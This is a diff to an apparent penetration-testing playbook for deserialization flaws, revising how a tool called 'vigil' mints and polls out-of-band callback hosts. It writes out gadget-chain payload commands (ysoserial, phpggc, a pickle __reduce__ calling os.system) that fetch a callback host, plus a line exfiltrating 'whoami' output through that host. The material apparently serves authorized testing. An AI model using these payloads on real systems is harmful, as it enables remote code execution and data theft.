@@ -22,7 +22,7 @@ vuln_class: deserialization
 - phpggc (PHP gadget chains — run host-side to generate payloads)
 - Burp Suite (Java Deserialization Scanner extension — use to identify candidate parameters, then deliver confirmed payloads via kali exec)
 - ppickle exploit generator (Python — host-side payload generation)
-- `vigil oob mint` / `vigil oob poll` (blind gadget-chain confirmation — mint a callback URL, use it as the gadget command, poll for the correlated hit; see "Blind Confirmation via OOB" below — replaces reading the listener log by hand)
+- `vigil oob mint` / `vigil oob poll` (blind gadget-chain confirmation — `mint` binds the nonce under a running client's interactsh id so `poll` can correlate it; pass `--client <name>` when several clients run; fire the EXACT host mint prints (`$OOB_HOST`) as the gadget command, then poll for the correlated hit; see "Blind Confirmation via OOB" below — replaces reading the listener log by hand)
 - `vigil assess classify-payload <blob> --mutations` (type the serialized blob / tampered field and generate type-confusion + escalation variants — see "Type the Serialized Value" below)
 - Custom scripts for .NET formatters (run via `vigil assess kali exec --technique RCE ... -- python3 ...` if target-facing)
 
@@ -125,20 +125,19 @@ Deserialization RCE is almost always blind — the gadget executes but stdout ne
 
 ```bash
 vigil oob status --json
-vigil oob mint --technique deserialization --target-url "https://target/api" --param session --probe-kind dns
-# -> http  http://<prefix>-<token>.oob.example.com/
-#    dns   <prefix>-<token>.oob.example.com
+vigil oob mint --client <name> --technique deserialization --target-url "https://target/api" --param session --probe-kind dns
+# → host  <prefix>-<token>.<client-id>.oob.example.com   (= $OOB_HOST)
 ```
 
-Feed the minted host as the command when generating the chain, then deliver via the kali exec wrapper:
+Feed the EXACT host mint prints (`$OOB_HOST` — the nonce bound under the client id; never hand-build a bare `<nonce>.oob...` host) as the command when generating the chain, then deliver via the kali exec wrapper:
 
 ```bash
 # Java — ysoserial command = the callback fetch
-java -jar ysoserial.jar CommonsCollections1 'curl http://<prefix>-<token>.oob.example.com/' | base64
+java -jar ysoserial.jar CommonsCollections1 'curl http://$OOB_HOST/' | base64
 # Python pickle — __reduce__ returns the callback
-#   return (os.system, ('nslookup <prefix>-<token>.oob.example.com',))
+#   return (os.system, ('nslookup $OOB_HOST',))
 # PHP phpggc
-phpggc Laravel/RCE1 system 'curl http://<prefix>-<token>.oob.example.com/'
+phpggc Laravel/RCE1 system 'curl http://$OOB_HOST/'
 ```
 
 Correlate:
@@ -147,7 +146,7 @@ Correlate:
 vigil oob poll --client <name> --json
 ```
 
-A non-empty `matched` array for your nonce confirms blind code execution — each match ties the callback (`protocol`, `remote_address`) to the recorded probe (`technique`, `target_url`), proving *which* gadget chain fired. Exfil one field by prepending it to the host (`curl http://$(whoami).<prefix>-<token>.oob.example.com/`) — the value lands as the left label of the matched callback. DNS-only callbacks (use `nslookup`/`dig` gadgets, `--probe-kind dns`) still confirm execution where egress is firewalled to DNS. Empty `matched` after the payload lands → the chain did not execute (wrong gadget/library); rotate chains and record a runtime issue.
+A non-empty `matched` array for your nonce confirms blind code execution — each match ties the callback (`protocol`, `remote_address`) to the recorded probe (`technique`, `target_url`), proving *which* gadget chain fired. Exfil one field by prepending it to the host (`curl http://$(whoami).$OOB_HOST/`) — the value lands as the left label of the matched callback. DNS-only callbacks (use `nslookup`/`dig` gadgets, `--probe-kind dns`) still confirm execution where egress is firewalled to DNS. Empty `matched` after the payload lands → the chain did not execute (wrong gadget/library); rotate chains and record a runtime issue.
 
 ### 10. Data Tampering (Non-RCE)
 
